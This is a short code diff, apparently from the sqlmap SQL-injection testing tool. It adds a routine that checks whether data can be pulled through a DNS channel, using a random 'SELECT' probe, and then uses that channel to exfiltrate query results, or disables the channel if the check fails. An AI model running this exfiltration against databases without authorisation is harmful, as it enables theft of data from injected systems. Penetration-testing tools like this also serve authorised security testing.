@@ -60,8 +60,7 @@ def __goInference(payload, expression, charsetType=None, firstChar=None, lastCha
     value = None
     count = 0
 
-    if conf.dnsDomain:
-        value = dnsUse(payload, expression)
+    value = __goDns(payload, expression)
 
     if value is None:
         timeBasedCompare = (kb.technique in (PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED))
@@ -78,6 +77,26 @@ def __goInference(payload, expression, charsetType=None, firstChar=None, lastCha
         if not kb.bruteMode:
             debugMsg = "performed %d queries in %d seconds" % (count, calculateDeltaSeconds(start))
             logger.debug(debugMsg)
+
+    return value
+
+def __goDns(payload, expression):
+    value = None
+
+    if conf.dnsDomain and kb.dnsTest is not False:
+        if kb.dnsTest is None:
+            randInt = randomInt()
+            kb.dnsTest = dnsUse(payload, "SELECT %d" % randInt) == str(randInt)
+            if not kb.dnsTest:
+                errMsg = "test for data retrieval through DNS channel failed. Turning off DNS exfiltration support"
+                logger.error(errMsg)
+                conf.dnsDomain = None
+            else:
+                infoMsg = "test for data retrieval through DNS channel was successful"
+                logger.info(infoMsg)
+
+        if kb.dnsTest:
+            value = dnsUse(payload, expression)
 
     return value
 
